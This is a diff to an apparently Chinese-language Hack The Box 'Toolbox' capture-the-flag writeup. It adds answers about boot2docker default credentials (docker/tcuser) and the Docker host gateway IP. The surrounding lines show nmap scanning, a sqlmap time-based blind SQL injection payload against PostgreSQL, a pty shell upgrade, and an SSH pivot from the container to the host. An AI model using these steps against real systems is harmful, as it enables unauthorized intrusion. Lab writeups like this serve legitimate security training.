@@ -1,4 +1,18 @@
 ## Toolbox
+### Docker-Toolbox 运行的是 boot2docker Linux 发行版。该发行版中 docker 用户的默认密码是什么？docker/tcuser
+```
+docker@box:/$ cat /etc/os-release                                              
+NAME=Boot2Docker
+VERSION=19.03.5
+ID=boot2docker
+ID_LIKE=tcl
+VERSION_ID=19.03.5
+PRETTY_NAME="Boot2Docker 19.03.5 (TCL 10.1)"
+ANSI_COLOR="1;34"
+HOME_URL="https://github.com/boot2docker/boot2docker"
+SUPPORT_URL="https://blog.docker.com/2016/11/introducing-docker-community-directory-docker-community-slack/"
+BUG_REPORT_URL="https://github.com/boot2docker/boot2docker/issues"
+```
 ```
 [★]$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.96.171 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
 ┌─[us-dedivip-2]─[10.10.14.93]─[syareya55@htb-jhoyqs8t8m]─[~]
@@ -151,7 +165,7 @@ Parameter: username (POST)
     Title: PostgreSQL > 8.1 AND time-based blind
     Payload: username=admin' AND 5151=(SELECT 5151 FROM PG_SLEEP(5)) AND 'TJJe'='TJJe&password=123456
 ---
-[00:46:31] [INFO] the back-end DBMS is PostgreSQL
+[00:46:31] [INFO] the back-end DBMS is PostgreSQL  //该网站使用的后端数据库是：PostgreSQL（简称 Postgres）
 web server operating system: Linux Debian 10 (buster)
 web application technology: Apache 2.4.38, PHP 7.3.14
 back-end DBMS: PostgreSQL
@@ -371,11 +385,12 @@ eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         TX packets 3118  bytes 3922117 (3.7 MiB)
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 
-                                         postgres@bc56e3cc55e9:/var/lib/postgresql$ 
+                                         postgres@bc56e3cc55e9:/var/lib/postgresql$
 ```
+#### 我们目前可以访问一个 Docker 容器。请问宿主机的 IP 地址是什么？172.17.0.1
 #### 文件系统是空的。
 #### Docker-Toolbox
-#### Docker Toolbox使用VirtualBox来运行包含所有容器的VM。这是通过使用VirtualBox上的Boot2Docker发行版。看看文档，默认的发现凭据为docker / tcuser。Docker主机始终存在于网关IP地址。
+#### Docker-Toolbox使用VirtualBox来运行包含所有容器的VM。这是通过使用VirtualBox上的Boot2Docker发行版。看看文档，默认的发现凭据为docker / tcuser。Docker主机始终存在于网关IP地址。
 ```
 postgres@bc56e3cc55e9:/$ python3 -c "import pty;pty.spawn('/bin/bash')"
 postgres@bc56e3cc55e9:/$ ssh docker@172.17.0.1
